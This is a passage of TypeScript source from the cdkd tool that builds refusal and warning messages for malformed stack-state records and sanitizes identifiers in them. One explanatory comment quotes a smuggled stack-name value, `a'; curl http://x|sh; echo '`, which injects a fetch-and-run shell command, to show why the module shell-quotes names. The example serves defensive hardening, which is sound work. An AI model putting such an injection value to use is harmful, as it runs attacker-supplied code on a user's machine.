import { CdkdError } from '../utils/error-handler.js';
import { markNonRetryable } from '../deployment/retryable-errors.js';
import {
  IDENT_MAX_CODE_POINTS,
  STACK_REF_MAX_CODE_POINTS,
  UNRENDERABLE,
  displayIdent,
  displaySafe,
  truncateCodePoints,
} from '../utils/display-safe.js';
import { shellQuote } from './lock-contention-message.js';
import { isReadableBag } from '../types/state.js';
import type { StackState } from '../types/state.js';

/**
 * The identifier cap every message here uses unless a caller says otherwise.
 * See {@link safeIdentifier} for why it is a parameter at all.
 */
const IDENT_CAP_DEFAULT = 128;

/** The error code every malformed-record refusal carries, whatever its class. */
export const STATE_RESOURCES_MALFORMED = 'STATE_RESOURCES_MALFORMED';

/**
 * Answer the ONE question both helpers below key on: can this record's
 * resource map be read at all?
 *
 * Widened past `null` / `undefined` because the message says "no readable
 * resources map" and a hand-edited record does not stop at those two: a
 * `[]`, a `5` or a `"ab"` all survive `Object.entries` and yield a bag that is
 * empty or, for the string, absurd — repaired silently and warned about
 * nowhere. The predicate is the plain-object test the bag's own type implies.
 */
export function hasReadableResources(state: StackState): boolean {
  return isReadableBag(state.resources);
}

/**
 * The same question for the `outputs` bag — and it is a SEPARATE predicate
 * rather than a second argument to the one above because the ABSENCE rule
 * differs, which is the split {@link isReadableBag}'s own note calls a
 * per-container call.
 *
 * An absent `outputs` bag is an ordinary record, not a defect: `cdkd scrub`
 * round-trips one deliberately rather than materializing `{}` over it, and the
 * deploy's failure-path saves write `outputs: currentState.outputs`, which
 * `JSON.stringify` drops when it is `undefined`. So `undefined` is EXEMPT here
 * while it is a defect for `resources`. `null` is NOT exempt — it is a value a
 * hand-edited record carries and every consumer either throws on it or
 * launders it into `{}`.
 *
 * Both {@link repairMalformedOutputsForReadOnly} and
 * {@link refuseMalformedOutputs} delegate to this, so the read-only and the
 * write-capable halves cannot come to different verdicts about the same record.
 */
export function hasReadableOutputs(state: Pick<StackState, 'outputs'>): boolean {
  return state.outputs === undefined || isReadableBag(state.outputs);
}

/**
 * The plain-object test itself, without the `resources` field bound to it.
 *
 * RE-EXPORTED, not defined here any more: it MOVED to `src/types/state.ts` with
 * go-to-k/cdkd#3192, whose own doc carries the full rationale and the reason for
 * the move (`importableOutputKeys` needs the predicate, and it sits in the layer
 * this module imports FROM). Every importer of this module is unchanged — the
 * same shape, and the same reason, as `DEFAULT_STATE_PREFIX` moving into
 * `src/state/state-prefix.ts`.
 *
 * Enumerate the consumers with `grep -rn "isReadableBag" src/` rather than from
 * a list here; four successive enumerations of them, written by reasoning, came
 * out incomplete.
 */
export { isReadableBag };

/**
 * The shared explanation, in the terms the reader needs: what is wrong, what
 * to look at, and what NOT to do next.
 *
 * Both identifiers are SANITIZED and THEN SHELL-QUOTED, and the command is
 * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
 * `.claude/rules/layout-state-types.md` require of any suggestion a user is
 * meant to paste, for two separate reasons.
 *
 * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
 * printable-ASCII allowlist, so it removes the line- and escape-forgery class
 * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
 * trusted here, since a stack name reaches the cross-stack read path from an
 * `Fn::GetStackOutput` argument or an S3 key. A name spelled
 * `a'; curl http://x|sh; echo '` would close the quoting and append its own
 * command to the line this text tells the user to RUN.
 *
 * Wrapping the command in `'...'` is not enough either, and is what makes the
 * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
 * produces something unpastable. Hence unwrapped and last.
 *
 * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` rather than
 * nothing — an empty argument makes `--stack-region` swallow the next flag,
 * turning a remedy into a differently-broken command.
 *
 * MODULE-PRIVATE, and it stayed that way after go-to-k/cdkd#3206's review
 * considered exporting it. `cdkd scrub`'s audited-record refusal needed the
 * same three properties (sanitize, cap, `UNRENDERABLE` on empty) plus a
 * BOUNDARY, because its names go into a comma-joined list where a name
 * containing the delimiter forges an entry. `displayIdent` has all four —
 * JSON-quoting escapes the delimiter it adds — so that caller uses it and this
 * stays private. The pair here is not duplicated: what differs is the
 * `shellQuote` composition every message in THIS module needs and that one
 * must not have.
 */
function safeIdentifier(value: string, maxCodePoints = IDENT_CAP_DEFAULT): string {
  // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
  // planted multi-kilobyte one would push the trailing remedy command off the
  // reader's screen -- the message would be technically correct and useless.
  // `truncateCodePoints` rather than `slice`, so the cut never lands inside a
  // surrogate pair; `displaySafe` rather than `displayIdent`, because the
  // latter JSON-quotes and that would compose badly with `shellQuote` below.
  //
  // The cap is a PARAMETER because one caller's verdict turns on it:
  // `malformedDestroyResourcesRefusalMessage` withholds its remedy unless the
  // identity renders EXACTLY, and at 128 an ordinary multi-level CDK nested
  // child (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150
  // code points) truncates -- so a HEALTHY record took the fallback arm. That
  // site passes `STACK_REF_MAX_CODE_POINTS`, which is the grammar a cdkd
  // state-record reference is legitimate up to and the same bound
  // `isPasteableIdent` uses. Still bounded, so a planted multi-kilobyte name
  // is truncated there too and lands in the withhold arm.
  const safe = displaySafe(value, { asciiOnly: true });
  if (!safe) return UNRENDERABLE;
  const { text, truncated } = truncateCodePoints(safe, maxCodePoints);
  return truncated ? `${text}...` : text;
}

/**
 * The DIAGNOSIS sentence itself, with no identity and no remedy in it.
 *
 * ONE spelling, for the reason {@link malformedStateDetail} gives for existing
 * at all: two copies of a diagnosis are what drift. It is extracted because
 * {@link malformedDestroyResourcesRefusalMessage} needs the same sentence
 * under an identity it does NOT trust, where the detail's substituted
 * `cdkd state show` command must not appear — a difference in the COMMAND, not
 * in the diagnosis.
 */
const MALFORMED_RESOURCES_DIAGNOSIS =
  `has no readable 'resources' map — the record is malformed or truncated. Both 'cdkd deploy' ` +
  `and 'cdkd destroy' REFUSE such a record rather than acting on it: they read the same map, ` +
  `an unreadable one is indistinguishable from an empty stack, and acting on that reading ` +
  `would make a deploy re-CREATE every resource and a destroy delete none of them.`;

function malformedStateDetail(
  stackName: string,
  region: string,
  maxCodePoints = IDENT_CAP_DEFAULT
): string {
  const stack = safeIdentifier(stackName, maxCodePoints);
  const reg = safeIdentifier(region, maxCodePoints);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) ${MALFORMED_RESOURCES_DIAGNOSIS} ` +
    `Inspect it with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For a READ-ONLY command: give the record an empty resource bag so the
 * command can report on it, and say so (issue go-to-k/cdkd#3018).
 *
 * `parseStateBody` deliberately does not validate the inner shape, so a
 * hand-edited or truncated record reaches a command with `resources` absent,
 * `null`, or some other non-object. Every such command then died on a raw
 * `TypeError` from the first `Object.keys` / `in` / index read — the exact
 * wording differs per shape (`Cannot convert undefined or null to object`,
 * `Cannot use 'in' operator`, `Cannot read properties of null`), and none of
 * them names a stack, a key or a remedy, from exactly the commands a user
 * reaches for WHEN the state is broken.
 *
 * WHY AT THE LOAD AND NOT AT EACH LOOP. The first cut of #3018 put `?? {}` on
 * the twelve `Object.entries(state.resources)` loops, which was inert: every
 * one of those flows dereferences the bag EARLIER — `!(id in state.resources)`,
 * `hasOwnProperty.call(...)`, `state.resources[logicalId]` — so the abort still
 * happened one line up and the guards only made it look handled. One call per
 * load dominates the whole flow behind it, including the helpers that take the
 * state as a parameter (`orphan-rewriter`, `diff-calculator`,
 * `collectCcApiRoutes`).
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true`. A silent repair is its own defect — an empty resource set is
 * indistinguishable from a healthy empty stack in every later line of output,
 * so `No changes detected` over an unreadable record is a clean verdict about
 * nothing.
 *
 * **Only for a command that cannot WRITE state.** Anything that can persist
 * uses {@link refuseMalformedState} instead; see its note.
 */
export function repairMalformedResourcesForReadOnly(state: StackState): boolean {
  if (hasReadableResources(state)) return false;
  state.resources = {};
  return true;
}

/**
 * The refusal TEXT, for a command whose own exit-code contract means this
 * cannot be a plain `CdkdError`.
 *
 * `cdkd scrub` is the case: its exit `1` is SPOKEN FOR ("--fail found
 * plaintext") and every one of its refusals carries `exitCode = 2`, because a
 * CI gate reading the code alone must be able to tell "scrub looked and found
 * a leak" from "scrub refused to look" — the two call for opposite responses.
 * So scrub tests {@link hasReadableResources} and raises its own class around
 * this text rather than calling {@link refuseMalformedState}.
 *
 * The other three refusing commands do NOT share that need, and giving them a
 * single shared code would be wrong in the other direction: `cdkd rollback`
 * documents `2` as "PARTIAL — journal kept, idempotent re-run", so a `2` here
 * would tell an operator to re-run a command that attempted nothing.
 */
export function malformedStateRefusalMessage(stackName: string, region: string): string {
  return (
    `${malformedStateDetail(stackName, region)} This command can WRITE state, so it refuses ` +
    `rather than continuing: saving over a record whose resource map could not be read would ` +
    `replace the evidence with a well-formed empty one and lose it permanently. Repair or ` +
    `remove the record first.`
  );
}

/**
 * The DESTROY refusal text for the `resources` bag (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * A SECOND `resources` refusal beside {@link malformedStateRefusalMessage},
 * for the reason every split in this module is its own: that text says saving
 * over the record "would replace the evidence with a well-formed empty one",
 * which is not what a destroy does. A destroy DELETES the record, and it does
 * so down a path the other four refusing commands never take.
 *
 * What the runner does with the bag is COUNT it —
 * `Object.keys(state.resources).length` — and route on the count. The count is
 * the list of what to delete, so an unreadable bag counts ZERO and the run
 * takes the EMPTY-STACK FAST PATH, which deletes `state.json` outright. Every
 * resource the record named stays live in AWS, now unreferenced, and the
 * destroy reports success.
 *
 * **Reading the bag as EMPTY — the read-only repair — IS that outcome rather
 * than an alternative to it**, which is why no repair is available here.
 * Measured rather than reasoned: `[]`, `5` and `true` all enumerate no keys,
 * so they already ARE the repaired-to-`{}` shape, and each one reaches the
 * fast path today. The same measurement
 * {@link refuseMalformedResourceProperties} records one container down.
 *
 * It NAMES `cdkd state orphan`, which the sibling refusals do not, and
 * that answers the objection go-to-k/cdkd#3161 raises against refusing at all
 * — that a cleanup command refusing leaves the user with no supported way to
 * tear the stack down. Proceeding would not tear anything down either, and
 * that is per-shape rather than a slogan: `[]` / a number / a boolean name no
 * resource at all, while a STRING names one fabricated logical id per
 * character whose ENTRY is a single character — so `resourceType` and
 * `physicalId` are both `undefined` and `ProviderRegistry.getProviderFor`
 * throws before any provider is selected, which means no AWS delete is issued
 * and no live resource can be addressed. (Measured 2026-09-17 against the real
 * registry: `Cannot read properties of undefined (reading 'startsWith')`, out
 * of the `isCustomResource` test — a routing failure, NOT a `provider.delete`
 * rejection, which an earlier revision of this note claimed.) What a forced
 * run would do is therefore bounded by the record: on the first three shapes
 * it deletes `state.json` and nothing else, and on a string every fabricated
 * id fails and `errorCount > 0` keeps a record — but keeps it LAUNDERED, since
 * the preserve-write spreads the bag (`{ ...state.resources }`) and `'ab'`
 * comes back as a well-formed `{"0":"a","1":"b"}`. So "it preserves the
 * evidence" would be the wrong defence of proceeding; the string shape reaches
 * the same laundering by another route, which strengthens the refusal rather
 * than weakening it (review round 2 of go-to-k/cdkd#3332). The only outcome
 * worth offering is the record's removal, and `cdkd state orphan` is the
 * supported command for it, leaving the live resources in place. It reads
 * `state.resources` nowhere, which is what makes the pointer true and is
 * fenced in `tests/unit/state/malformed-resources-bag.test.ts`.
 *
 * **That remedy is a TEMPLATE, not a substituted command, and the asymmetry
 * with the `cdkd state show` line above it is the point.** `state orphan`
 * DELETES a record; `state show` reads one. The `region` this function is
 * handed comes from `destroy-runner.ts`'s
 * `state.region ?? ctx.baseRegion`, and `state.region` is RECORD-BODY content
 * that `getState` does not check against the key it loaded from — measured
 * 2026-09-17: a record planted at `.../us-east-1/state.json` carrying
 * `"region": "eu-west-1"` rendered a pasteable
 * `cdkd state orphan <stack> --stack-region eu-west-1`, aiming a destructive
 * command at a DIFFERENT region's record for the same stack. That is the
 * misdirection class {@link stackClause} records for stack names, one field
 * over. Substituting into the read-only `state show` line is the pre-existing
 * behaviour of {@link malformedStateDetail} and is left alone; what this lane
 * must not add is a destructive one. The divergence itself — the runner also
 * LOCKS and DELETES against the body region — is go-to-k/cdkd#3328.
 *
 * **A template is not enough on its own, because the name the reader would
 * type into it comes from the clause ABOVE.** `safeIdentifier` composes
 * `displaySafe` with a cap, and `displaySafe` TRIMS — so a planted
 * `resources["..."]` record keyed `"prod-api "` opens this message as
 * `State for 'prod-api' (...)`, byte-identical to a HEALTHY sibling spelled
 * `prod-api`. An operator who then orphans "the record the line above names"
 * deletes the intact one. That is exactly the identity failure `displayIdent`
 * exists for and {@link namedPropertyBagsClause} applies to logical ids. So
 * the remedy sentence is GATED on the identity rendering EXACTLY: when it does
 * not, the text names no removal target at all and opens on
 * {@link stackClause}'s no-identity form, ending on
 * {@link inspectCommand}'s TEMPLATE rather than on a command built from the
 * very identity it just called untrustworthy. The same call
 * `buildForceUnlockCommand` makes when a value would render misleadingly.
 *
 * **Rendering exactly is not the same as being TRUE, and the EXACT arm must
 * not claim it is.** `exact` answers a question about this message's own text;
 * it says nothing about PROVENANCE. A planted `"region": "eu-west-1"` on a
 * `.../us-east-1/` key is an ordinary region string, so it renders exactly and
 * the arm fires — and an earlier revision then said to run `cdkd state orphan`
 * "with the stack and region this message NAMES", which is the attacker's
 * region (review round 2 of go-to-k/cdkd#3332: templating had removed the
 * paste, not the aim). The arm therefore points at the record's S3 KEY, which
 * `getState` resolved and a record body cannot forge, and says outright that
 * the region printed above is body-derived and need not match it. The
 * divergence is go-to-k/cdkd#3328.
 *
 * **The cap this arm measures against is `STACK_REF_MAX_CODE_POINTS`, not the
 * 128 every other text in this module uses**, and it is threaded rather than
 * hard-coded because the VERDICT turns on it. At 128 an ordinary multi-level
 * CDK nested child (`<root>~<...NestedStackResource><hash>~<...>`, measured
 * past 150 code points) truncates, fails `exact`, and takes the withhold arm
 * on a HEALTHY record — which is fail-safe but makes the fallback the common
 * path for exactly the nested destroys this lane added a guard to (review
 * round 2 of go-to-k/cdkd#3332). The bound is still a bound: a planted
 * multi-kilobyte name is truncated at 1152 and lands in the withhold arm.
 *
 * Identifiers are sanitized and THEN shell-quoted, for the reasons
 * {@link safeIdentifier}'s note gives.
 */
export function malformedDestroyResourcesRefusalMessage(stackName: string, region: string): string {
  // EXACTNESS, not merely printability: `safeIdentifier` may trim, substitute
  // or truncate, and each of those can render a planted identifier as a
  // healthy one. Compared against the RAW value, so any divergence at all
  // suppresses the target-naming half.
  // The cap is the STATE-RECORD grammar, not the 128 every other text here
  // uses: this arm's VERDICT turns on it, and at 128 an ordinary multi-level
  // nested child truncates and a healthy record takes the withhold arm.
  const cap = STACK_REF_MAX_CODE_POINTS;
  const exact =
    safeIdentifier(stackName, cap) === stackName && safeIdentifier(region, cap) === region;
  // The DIAGNOSIS half. On the exact arm it is the shared detail, whose
  // pasteable `cdkd state show` is sound because the identity renders
  // faithfully. On the withhold arm it must NOT be: a message that has just
  // said "another record may render identically" cannot then hand over a
  // command built from that rendering — following it would READ the healthy
  // sibling, return a clean record, and raise the operator's confidence right
  // before the destructive step. So that arm takes the module's own
  // no-identity form instead.
  const detail = exact
    ? malformedStateDetail(stackName, region, cap)
    : `${stackClause(undefined, undefined)} ${MALFORMED_RESOURCES_DIAGNOSIS}`;
  const remedy = exact
    ? `To drop the record deliberately and leave the live resources standing, run ` +
      `'cdkd state orphan' against the stack and the region THE RECORD'S S3 KEY holds — ` +
      `spelled out rather than pasteable, because that command DELETES a record and the region ` +
      `printed above is read from the record's own BODY, which need not match its key. ` +
      `Confirm the key with 'cdkd state list --long' — a legacy record shows none, and for one ` +
      `of those the flag must be OMITTED or it selects nothing — then: ` +
      `cdkd state orphan <stack> --stack-region <region>`
    : `This record's stack name or region does NOT render exactly — what is printed above is a ` +
      `sanitized form, and another record may render identically — so this message names no ` +
      `target and offers no command against one. List the records as stored with ` +
      `'cdkd state list --long', which prints a name needing sanitizing in quoted form, and act ` +
      `on the one whose key matches. Inspect it with: ${inspectCommand(undefined, undefined)}`;
  return (
    `${detail} This command DELETES state, so it refuses ` +
    `rather than continuing: the resource map IS the list of what to delete, so an unreadable ` +
    `one counts as ZERO resources and the run takes the empty-stack fast path, which removes ` +
    `state.json and reports success while every resource the record named is still live in AWS ` +
    `and no longer referenced by anything. Reading the bag as EMPTY is that same outcome rather ` +
    `than an alternative to it, so there is no repair available here. Repair or remove the ` +
    `record first. ${remedy}`
  );
}

/**
 * For `cdkd destroy` / `cdkd state destroy`: refuse a record whose `resources`
 * bag cannot be read (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * The `resources` twin of {@link refuseMalformedOutputsForDestroy}, and a
 * SEPARATE call from it for the reason that one is separate from
 * {@link refuseMalformedOutputs}: a record can be malformed in either
 * container alone and the refusal must name the one that is broken.
 *
 * CALL IT AT THE TOP OF THE DESTROY, **above the `resourceCount` read**. The
 * placement rule is {@link repairMalformedResourcesForReadOnly}'s and it is
 * not decoration here: the empty-stack fast path sits immediately below that
 * read and DELETES the record, so a guard written anywhere below it refuses a
 * record that is already gone.
 */
export function refuseMalformedResourcesForDestroy(
  state: StackState,
  stackName: string,
  region: string
): void {
  if (hasReadableResources(state)) return;
  // `markNonRetryable` for the reason `refuseMalformedOutputsForDestroy`
  // carries it: the verdict comes from a PERSISTED record, so no retry can
  // change it, while the message interpolates caller-derived identifiers a
  // SUBSTRING-matching retry classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyResourcesRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The DEPLOY refusal text for the `resources` bag (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * A THIRD `resources` text, and not {@link malformedStateRefusalMessage}'s for
 * the same reason the destroy one is not: that text describes the SAVE as the
 * harm, and here the save is the last thing that happens rather than the
 * first. An unreadable map reads as zero RECORDED resources, so the change
 * calculation plans every resource the template declares as a CREATE and the
 * deploy re-provisions the whole stack against live AWS — colliding on every
 * deterministic name and duplicating the rest — before saving a well-formed
 * record over the only evidence anything was wrong. An operator told their
 * record would be "replaced with a well-formed empty one" would not know that
 * running anyway duplicates their stack.
 *
 * **It must be true under `cdkd deploy --dry-run` as well**, which it is: the
 * guard sits at the state LOAD, above the diff and above the `if
 * (this.options.dryRun)` return, so a dry run reaches it. Refusing there is
 * the decision {@link malformedResourcePropertiesRefusalMessage} records for
 * the sibling container, for the same reason — the repaired PREVIEW is
 * available one command over from `cdkd diff`, which repairs this bag and
 * warns, so refusing here costs nothing that is not already offered, while a
 * plausible `--dry-run` plan followed by a refusal the moment the flag comes
 * off would be the worst arm of all.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedDeployResourcesRefusalMessage(stackName: string, region: string): string {
  return (
    `${malformedStateDetail(stackName, region)} 'cdkd deploy' can WRITE state and AWS ` +
    `resources, so it refuses rather than continuing — under '--dry-run' too, because the plan ` +
    `a dry run would print is the wrong one: an unreadable map reads as ZERO recorded ` +
    `resources, so every resource the template declares is planned as a CREATE and the deploy ` +
    `re-provisions a stack that already exists, colliding on each deterministic name and ` +
    `duplicating the rest, then saves a well-formed record over the only evidence anything was ` +
    `wrong. Reading the bag as EMPTY produces that same plan rather than avoiding it. Nothing ` +
    `was provisioned and no state was written FOR THIS STACK. Repair or remove the record ` +
    `first; 'cdkd diff' previews the stack with this map read as EMPTY and warns that it did.`
  );
}

/**
 * For `cdkd deploy`: refuse a record whose `resources` bag cannot be read
 * (issue [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * The gap go-to-k/cdkd#3317's review named and left: that lane closed the
 * per-entry `properties` container at `DiffCalculator.calculateDiff`, and
 * {@link unreadableResourcePropertyBags} deliberately returns `[]` for a
 * record whose ROOT bag is unreadable — so `"resources": "abcdef"` reached the
 * deploy diff, enumerated two fabricated logical ids, and re-created the
 * stack. {@link refuseMalformedState}'s callers are `import.ts`, `orphan.ts`
 * and `rollback.ts`, none of which is on this path.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedOutputs} — the placement
 * rule {@link repairMalformedResourcesForReadOnly}'s note records. Not at
 * `calculateDiff`: the engine's own load dominates that call AND the twelve
 * reads between them — five, measured 2026-09-17 over comment-stripped source;
 * re-derive rather than trusting the figure — the first of which
 * (`Object.keys(currentState.resources)` in a debug line) is where a `null`
 * bag raised the bare `TypeError` #3018 exists to remove.
 */
export function refuseMalformedResourcesForDeploy(
  state: StackState,
  stackName: string,
  region: string
): void {
  if (hasReadableResources(state)) return;
  // `markNonRetryable` for the reason `refuseMalformedResourceProperties`
  // carries it: a nested child's deploy runs inside the parent's
  // `withRetry(provider.create)`, the verdict comes from a persisted record no
  // retry can change, and the message interpolates identifiers a
  // SUBSTRING-matching classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedDeployResourcesRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * A record container a TEXT view walks with `Object.entries`, other than the
 * `resources` bag the rest of this module is about.
 *
 * A CLOSED union because a container name is the VIEW's own vocabulary — the
 * set of blocks it renders — not anything a record can name. Widening it to
 * `string` would let a caller hand the warning below a key read out of a
 * hand-edited record, which is a different message from the one this is.
 *
 * That is a design reason and NOT a safety one, and the distinction is
 * load-bearing: {@link malformedRenderedContainersWarning} sanitizes every name
 * it prints, so the closed union is not what stops a forged one from forging a
 * line. Do not read this note as licence to drop that sanitizing — an earlier
 * revision of this comment said the opposite and would have licensed exactly
 * that (review of go-to-k/cdkd#3190).
 */
export type RenderedStateContainer = 'outputs' | 'skippedOutputs' | 'attributes' | 'properties';

/**
 * The warning a view emits when it emptied one or more {@link
 * RenderedStateContainer}s it could not walk (go-to-k/cdkd#3187).
 *
 * Deliberately NOT {@link malformedResourcesWarning}'s text, and the reason is
 * narrower than it looks. That one tells the reader not to run `cdkd deploy` /
 * `cdkd destroy` because an unreadable `resources` MAP is indistinguishable
 * from an empty stack: deploy would re-CREATE everything and destroy would
 * delete nothing. No container named here can produce that specific confusion —
 * the resource SET is still readable — so borrowing that sentence would attach
 * a re-create-the-world warning to a record whose resource list is intact.
 *
 * It is NOT that these containers are display-only. `properties` is read by the
 * deploy change calculation (`src/analyzer/diff-calculator.ts`), where a
 * non-object compares unequal to any
 * desired object and yields a spurious property-change set — measured there as
 * a REPLACEMENT of the live resource, and closed by
 * {@link refuseMalformedResourceProperties} (go-to-k/cdkd#3191). An earlier
 * revision of this comment asserted the display-only premise, which would have
 * read as licence to drop a guard on that path (review of go-to-k/cdkd#3190).
 * That the path is now guarded does not restore the premise: this text is still
 * not the one to borrow, because the deploy path REFUSES where these views
 * continue.
 *
 * What stays the same is the remedy: `--json` is the mode that shows the
 * stored value.
 *
 * ONE warning per record however many containers it names — a stack whose 500
 * resources all carry a hand-edited `properties` gets one line, not 500. The
 * caller FILTERS a fixed order (`RENDERED_CONTAINER_ORDER`), so the text is
 * stable across records. Not `.sort()` — that order is deliberately not
 * alphabetical, and its own JSDoc says so.
 *
 * Both identifiers are sanitized and then shell-quoted, and the command is
 * emitted LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s own note
 * gives.
 *
 * The container NAMES take {@link safeIdentifier} too — the SAME helper, so
 * they cannot drift from it — but NOT `shellQuote`, because they appear in the
 * PROSE and never inside the command this text tells the reader to run; the
 * command carries the two identifiers and nothing else.
 *
 * Sanitizing them is not dead code written for a case that cannot happen. The
 * union above is closed at COMPILE time, so without this the guarantee would
 * live in a comment, and the day a caller derives a name from a record instead
 * of from a literal an unsanitized element could forge a line, render as empty
 * quotes naming nothing, or run to kilobytes and push the remedy command off
 * the reader's screen. `safeIdentifier` closes all three and is the identity on
 * all four literals, so no user-visible text moves.
 *
 * What it does NOT close, stated rather than reassured away: a forged name made
 * only of printable ASCII still renders verbatim inside its quotes and could
 * read as prose. That residual is bounded to the PROSE — the command the reader
 * pastes is built from the two shell-quoted identifiers alone — and closing it
 * would mean JSON-quoting a name in the one place the text is meant to read as
 * English (review of go-to-k/cdkd#3190).
 */
export function malformedRenderedContainersWarning(
  stackName: string,
  region: string,
  containers: readonly RenderedStateContainer[]
): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  const names = containers.map((name) => `'${safeIdentifier(name)}'`).join(', ');
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has a non-object ${names} — the record ` +
    `is malformed or truncated. 'Object.entries' walks a string or a list as readily as a map, ` +
    `so rendering one INVENTS a row per character or element. Continuing with it EMPTY: this ` +
    `view shows no rows there, which is not the same as the record holding none. A per-resource ` +
    `container is named once however many resources hold one. See the stored values with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/** The warning a caller of {@link repairMalformedResourcesForReadOnly} emits. */
export function malformedResourcesWarning(stackName: string, region: string): string {
  return `${malformedStateDetail(stackName, region)} Continuing with an EMPTY resource set: this command's output describes zero resources, which is not the same as the stack having none.`;
}

/**
 * The `outputs` half of {@link repairMalformedResourcesForReadOnly}, for a
 * READ-ONLY command that DIFFS the stored bag rather than rendering it
 * (go-to-k/cdkd#3189).
 *
 * `computeOutputsDiff` enumerates the stored bag twice, the second walk
 * emitting one `REMOVE` row per stored key today's template no longer declares.
 * It used to admit the bag on a bare `?? {}`, which covers `null` and
 * `undefined` only — so a hand-edited or truncated record whose `outputs` holds
 * a string or a list previewed the REMOVAL of outputs that never existed, one
 * row per character or element, each carrying a character of the record as its
 * `old:` side, with `cdkd diff --fail` exiting 1 on them.
 *
 * AT THE LOAD, for the reason
 * {@link repairMalformedResourcesForReadOnly}'s own note records and one more
 * that is specific to this container: `cdkd diff` dereferences the stored bag
 * BEFORE the walk that fabricates. `resolveTemplateOutputs` asks
 * `hasOwnProperty.call(storedOutputs, key)` for go-to-k/cdkd#2740's
 * skipped-output record and for go-to-k/cdkd#1942's literal `Export.Name`
 * verdict — which ANSWERS TRUE on a string for `'0'` or `'length'`, and THROWS
 * outright on `null` (`Cannot convert undefined or null to object`). So a guard
 * written at `computeOutputsDiff` alone leaves a wrong decision, or a raw
 * `TypeError`, one call above it.
 *
 * ABSENT IS EXEMPT AND `null` IS NOT, which is the one place this diverges from
 * {@link isReadableBag}'s verdict, and the split is measured rather than
 * stylistic. Both stored-bag lookups named above gate on
 * `storedOutputs !== undefined` before the `hasOwnProperty` call, so an ABSENT
 * bag never reaches one; every other consumer on the diff path carries its own
 * `?? {}` (`mergeNoChangeOutputs`'s `persisted`, `importableOutputKeys`, this
 * function's own walk). An absent bag is therefore inert, exactly the condition
 * under which `state.ts`'s `repairRenderedContainers` exempts it — and warning
 * would be a false positive on a record cdkd itself supports: `cdkd scrub`
 * round-trips a record with no `outputs` deliberately, refusing to materialize
 * `{}` over it, and the deploy's failure-path saves write
 * `outputs: currentState.outputs`, which `JSON.stringify` drops when it is
 * undefined. A `null` bag is NOT inert — it passes the `!== undefined` gate and
 * `hasOwnProperty.call(null, ...)` throws — so it is repaired and warned about
 * like any other unreadable shape.
 *
 * That leaves one clause of go-to-k/cdkd#3189's stated floor overridden on
 * purpose: it asked that a `null` bag "diff exactly as it does today and say
 * nothing", and diffing exactly as it does today means THROWING. Recorded on
 * the issue rather than silently traded.
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true` with {@link malformedOutputsWarning}. Read-only commands ONLY, for
 * the reason {@link refuseMalformedState} gives — a bag laundered into a
 * well-formed empty one is permanent, and for `outputs` it would also take the
 * exports index with it on the next write.
 */
export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
  if (hasReadableOutputs(state)) return false;
  state.outputs = {};
  return true;
}

/**
 * The warning a caller of {@link repairMalformedOutputsForReadOnly} emits.
 *
 * Deliberately neither {@link malformedResourcesWarning}'s text nor
 * {@link malformedRenderedContainersWarning}'s, because the CONSEQUENCE of
 * continuing empty differs from both. The resources text forbids
 * `cdkd deploy` / `cdkd destroy` because an unreadable resource MAP is
 * indistinguishable from an empty stack; the resource set is intact here. The
 * rendered-containers text says the view "shows no rows there" — true of a
 * renderer, false of a diff, which does not go quiet on an empty stored bag but
 * reports every resolved output as an `ADD`. Saying so is the point: an
 * operator who reads `ADD` rows for outputs the stack already has needs to know
 * the comparison lost its left-hand side.
 *
 * Identifiers are sanitized and then shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOutputsWarning(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. Where the stored value is a string or a list, ` +
    `'Object.entries' walks it as readily as a map, so diffing it INVENTS a REMOVE row per ` +
    `character or element carrying the record's own characters; where it is a number, a boolean ` +
    `or null, it yields no comparison at all. Continuing with it EMPTY: every output this diff ` +
    `resolves is reported as an ADD and no stored key is reported as a REMOVE, which is not the ` +
    `same as the record holding none. See the stored value with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For a command that can WRITE state: refuse the record by name instead of
 * repairing it.
 *
 * Repairing is actively DANGEROUS here, and the PR that introduced this module
 * shipped that danger for one round before its security review caught it.
 * `cdkd scrub` gates its `saveState` on `recordsChanged > 0`, which an OUTPUTS
 * change alone satisfies — so a record holding `"resources": null` and a
 * plaintext secret in `outputs` would be scrubbed, and then saved back with a
 * repaired, WELL-FORMED `resources: {}`. The malformed record is the only
 * signal that anything is wrong; laundering it into a legitimate-looking empty
 * one is permanent and silent. The next `cdkd deploy` then reads zero resources
